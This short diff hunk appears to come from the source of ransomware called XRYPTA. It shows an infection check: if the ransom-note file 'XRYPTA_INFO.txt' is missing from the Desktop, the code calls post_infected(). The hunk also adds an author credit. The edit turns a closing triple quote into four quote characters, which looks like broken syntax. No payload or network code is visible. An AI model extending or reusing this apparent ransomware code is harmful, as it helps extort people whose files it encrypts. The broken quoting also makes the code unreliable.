@@ -131,4 +131,5 @@ if __name__ == '__main__':
                         if os.path.exists(os.path.join(os.path.expanduser("~\\Desktop"), 'XRYPTA_INFO.txt')):
                                 pass
                         else:
-                                post_infected()'''
+                                post_infected()''''
+#XRYPTA by SchynWong
